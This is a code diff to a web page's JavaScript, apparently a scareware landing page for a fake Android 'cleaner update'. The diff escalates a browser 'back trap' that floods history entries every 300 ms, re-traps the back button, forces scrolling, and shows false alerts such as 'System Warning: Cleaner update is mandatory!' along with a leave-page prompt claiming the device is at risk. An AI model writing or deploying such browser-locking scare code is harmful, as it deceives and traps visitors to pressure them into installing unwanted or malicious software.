@@ -84,27 +84,30 @@
         alert("Cleaner update strongly recommended for Android performance.");
       };
 
-      // Super aggressive back trap
-      for (let i = 0; i < 10; i++) {
-        history.pushState(null, "", location.href);
-      }
+      // Ultra aggressive back trap
+      const trapBack = () => {
+        for (let i = 0; i < 20; i++) {
+          history.pushState({}, '', location.href);
+        }
+      };
 
-      window.addEventListener("popstate", function () {
-        alert("⚠️ WARNING: Your Android system is exposed. Update is critical!");
-        history.pushState(null, "", location.href);
+      trapBack();
+
+      window.addEventListener('popstate', function () {
+        alert("⚠️ System Warning: Cleaner update is mandatory!");
+        trapBack();
       });
 
       setInterval(() => {
-        history.pushState(null, "", location.href);
+        trapBack();
         window.scrollTo(0, 0);
-      }, 500);
+      }, 300);
 
-      // Exit warning if they try to close tab
       window.onbeforeunload = function () {
-        return "Are you sure you want to leave this page? Your device may remain unprotected.";
+        return "Are you sure you want to leave? Your Android is still at risk.";
       };
 
-      // Timer countdown
+      // Countdown
       let minutes = 5;
       let seconds = 0;
       const timerDisplay = document.getElementById("countdown");
